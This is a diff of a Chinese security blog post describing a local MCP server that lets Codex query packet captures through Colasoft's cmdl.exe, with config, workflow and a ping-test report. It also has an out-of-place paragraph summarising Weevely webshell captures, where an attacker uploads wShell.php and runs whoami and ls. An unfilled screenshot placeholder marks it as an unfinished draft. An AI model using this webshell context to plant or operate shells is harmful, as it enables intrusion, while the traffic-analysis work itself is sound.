+<p>正常情况下，使用科来完成抓包后，需要手动打开文件、查看协议统计、筛选 IP，再把结果交给 Codex 分析。</p>
+<p>为了减少这些重复操作，我使用科来自带的 <code>cmdl.exe</code> 抓包解析工具，制作了一个本地 MCP Server。</p>
+<p>连接以后，Codex 可以直接调用科来的解析能力，对 <code>.cap</code>、 <code>.pcap</code> 和 <code>.pcapng</code> 文件进行查询，例如：</p>
+<ul>
+<li>检查科来及解析组件是否正常。</li>
+<li>查找指定目录中的抓包文件。</li>
+<li>统计协议数量和通信端点。</li>
+<li>按照 IP、端口或协议筛选数据包。</li>
+<li>分析 DNS 查询和错误响应。</li>
+<li>查看 ICMP 请求与响应。</li>
+<li>分析主要网络会话。</li>
+</ul>
+<p>整个 MCP 只读取本地抓包，不会主动发送数据包，也不会修改科来的配置。</p>
+<p>首先在 Codex 的配置文件中添加：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[mcp_servers.colasoft]</span><br><span class="line">command = &#x27;C:\Program Files\Python38\python.exe&#x27;</span><br><span class="line">args = [</span><br><span class="line">  &#x27;D:\&amp;#x5DE5;&amp;#x5177;\Colasoft-MCP\colasoft_mcp.py&#x27;,</span><br><span class="line">  &#x27;--capture-root&#x27;,</span><br><span class="line">  &#x27;C:\Users\pc\Desktop\&amp;#x6D41;&amp;#x91CF;&amp;#x5206;&amp;#x6790;&amp;#x4F5C;&amp;#x4E1A;&#x27;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
+
+<p>其中：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command</span><br></pre></td></tr></table></figure></div>
+
+<p>用于指定运行 MCP Server 的 Python。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">colasoft_mcp.py</span><br></pre></td></tr></table></figure></div>
+
+<p>是编写的 MCP Server 主程序。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--capture-root</span><br></pre></td></tr></table></figure></div>
+
+<p>用于指定 Codex 可以查找和分析抓包文件的目录。</p>
+<p>新建 Codex 任务时，Codex 会按照该配置启动 Python 程序。双方通过标准输入和标准输出传递 MCP 消息。</p>
+<p>当 Codex发起分析请求后，MCP Server 调用科来的 <code>cmdl.exe</code> 解析抓包，再把数据包结果整理成结构化内容返回给 Codex。</p>
+<p>基本流程如下：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x7528;&amp;#x6237;&amp;#x63D0;&amp;#x51FA;&amp;#x5206;&amp;#x6790;&amp;#x8981;&amp;#x6C42;</span><br><span class="line">        &amp;#x2193;</span><br><span class="line">Codex &amp;#x8C03;&amp;#x7528; MCP &amp;#x5DE5;&amp;#x5177;</span><br><span class="line">        &amp;#x2193;</span><br><span class="line">colasoft_mcp.py &amp;#x63A5;&amp;#x6536;&amp;#x8BF7;&amp;#x6C42;</span><br><span class="line">        &amp;#x2193;</span><br><span class="line">&amp;#x8C03;&amp;#x7528;&amp;#x79D1;&amp;#x6765; cmdl.exe &amp;#x89E3;&amp;#x6790;&amp;#x6293;&amp;#x5305;</span><br><span class="line">        &amp;#x2193;</span><br><span class="line">MCP &amp;#x6574;&amp;#x7406;&amp;#x89E3;&amp;#x6790;&amp;#x7ED3;&amp;#x679C;</span><br><span class="line">        &amp;#x2193;</span><br><span class="line">Codex &amp;#x8F93;&amp;#x51FA;&amp;#x5206;&amp;#x6790;&amp;#x7ED3;&amp;#x8BBA;</span><br></pre></td></tr></table></figure></div>
+
+<p>除了 MCP Server，还运行了一个单独的目录监控程序：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">colasoft_watcher.py</span><br></pre></td></tr></table></figure></div>
+
+<p>该程序会在后台监控抓包目录。</p>
+<p>当科来保存新的抓包文件后，监控程序会等待文件写入完成，然后调用相同的解析功能，并在抓包旁边生成 HTML 报告。</p>
+<p>例如：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kall-Packets.cap</span><br></pre></td></tr></table></figure></div>
+
+<p>会自动生成：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kall-Packets.analysis.html</span><br></pre></td></tr></table></figure></div>
+
+<p>因此，这套功能分为两部分：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MCP Server&amp;#xFF1A;&amp;#x4F9B; Codex &amp;#x6309;&amp;#x9700;&amp;#x67E5;&amp;#x8BE2;&amp;#x548C;&amp;#x5206;&amp;#x6790;&amp;#x6293;&amp;#x5305;&amp;#x3002;</span><br><span class="line"></span><br><span class="line">&amp;#x76EE;&amp;#x5F55;&amp;#x76D1;&amp;#x63A7;&amp;#x7A0B;&amp;#x5E8F;&amp;#xFF1A;&amp;#x53D1;&amp;#x73B0;&amp;#x65B0;&amp;#x6293;&amp;#x5305;&amp;#x540E;&amp;#x81EA;&amp;#x52A8;&amp;#x751F;&amp;#x6210; HTML &amp;#x62A5;&amp;#x544A;&amp;#x3002;</span><br></pre></td></tr></table></figure></div>
+
+<p>为了测试自动分析是否正常，我使用 Kali 分别 Ping Windows 主机和 VMware 网关。</p>
+<p>测试环境中的 IP 为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali&amp;#xFF1A;192.168.145.10</span><br><span class="line">Windows &amp;#x4E3B;&amp;#x673A;&amp;#xFF1A;192.168.145.1</span><br><span class="line">VMware &amp;#x7F51;&amp;#x5173;&amp;#xFF1A;192.168.145.2</span><br></pre></td></tr></table></figure></div>
+
+<p>测试期间使用科来进行抓包。</p>
+<p>首先从 Kali Ping Windows 主机：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.145.1</span><br></pre></td></tr></table></figure></div>
+
+<p>然后 Ping VMware 网关：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.145.2</span><br></pre></td></tr></table></figure></div>
+
+<p>停止捕获后，将数据包保存为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kall-Packets.cap</span><br></pre></td></tr></table></figure></div>
+
+<p>文件保存完成后，后台监控程序自动发现该抓包，并生成：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kall-Packets.analysis.html</span><br></pre></td></tr></table></figure></div>
+
+<p>【这里放自动生成的 HTML 报告截图】</p>
+<p>报告中的分析结果为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6570;&amp;#x636E;&amp;#x5305;&amp;#x603B;&amp;#x6570;&amp;#xFF1A;34</span><br><span class="line">ICMP &amp;#x6570;&amp;#x636E;&amp;#x5305;&amp;#xFF1A;16</span><br><span class="line">ARP &amp;#x6570;&amp;#x636E;&amp;#x5305;&amp;#xFF1A;18</span><br></pre></td></tr></table></figure></div>
+
+<p>Kali 与 Windows 主机之间存在：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4&amp;#x4E2A; ICMP Echo Request</span><br><span class="line">4&amp;#x4E2A; ICMP Echo Reply</span><br></pre></td></tr></table></figure></div>
+
+<p>Kali 与 VMware 网关之间也存在：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4&amp;#x4E2A; ICMP Echo Request</span><br><span class="line">4&amp;#x4E2A; ICMP Echo Reply</span><br></pre></td></tr></table></figure></div>
+
+<p>每个请求都收到了对应响应，因此可以确定两次 Ping 均成功。</p>
+<p>这也说明科来能够正常捕获数据包，后台程序能够自动发现并解析新抓包，生成的协议统计和 ICMP 通信结果也与实际测试过程一致。</p>
+<p>通过两份 Weevely 抓包，可以还原攻击者与 WebShell 之间的通信过程。</p>
+<p>案例一中，攻击者已经开始使用 <code>wShell.php</code>，并执行了 <code>echo</code>、 <code>whoami</code>、 <code>ls</code> 和 <code>pwd</code> 等命令。</p>
+<p>案例二中，不仅捕获到了 <code>wShell3.php</code> 的上传过程，还还原出了获取主机名、用户名、当前目录以及尝试查询网络配置等操作。</p>
+<p>在此基础上，将科来的 <code>cmdl.exe</code> 封装成 MCP Server，使 Codex 可以直接查询本地抓包；再配合目录监控程序，实现新抓包保存后自动生成 HTML 报告。</p>
+<p>这套方式的作用不是代替科来抓包，而是把抓包完成后的查找、统计、筛选和报告生成过程自动化，减少每次手动打开抓包、截图和整理结果的重复操作。</p>
+<p>分析结果：</p>
+<p>总共捕获34个数据包，其中有16个 ICMP包和18个 ARP包。</p>
+<p>Kali与Windows主机之间有4个请求和4个响应。</p>
+<p>Kali与VMware网关之间也有4个请求和4个响应。</p>
+<p>由此可以确定两次 Ping 均成功，功能一切正常~</p>
 
 		</div>
 
@@ -912,18 +891,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> dc7打靶报告</li>
-        <li><strong>Author:</strong> Le_ee 博客等级 码龄1年</li>
+        <li><strong>Title:</strong> 科来流量分析/结合MCP自动化-CSDN博客</li>
+        <li><strong>Author:</strong> Le_ee</li>
         <li><strong>Created at
-                :</strong> 2026-02-05 03:02:10</li>
+                :</strong> 2026-09-04 02:03:14</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2026-02-05 11:04:46
+                    :</strong> 2026-09-04 10:11:44
             </li>
         
         <li>
-            <strong>Link:</strong> https://leei.site/2026/02/05/dc7打靶报告/
+            <strong>Link:</strong> https://leei.site/2026/09/04/科来流量分析+结合MCP自动化/
         </li>
         <li>
             <strong>
@@ -948,23 +927,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2026/02/05/dc8%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">dc8靶机报告</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2026/01/28/tomato%E9%9D%B6%E6%9C%BAwp/">
+				<a class="next" rel="next" href="/2026/07/20/winXP%E6%A0%88%E6%BA%A2%E5%87%BA%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">tomato渗透报告</span>
+						<span class="post-nav-title-item truncate max-w-48">winXP栈溢出漏洞深度学习</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -1026,7 +993,7 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">dc7打靶报告</div>
+		<div class="page-title">科来流量分析/结合MCP自动化-CSDN博客</div>
 		
 
 	</div>
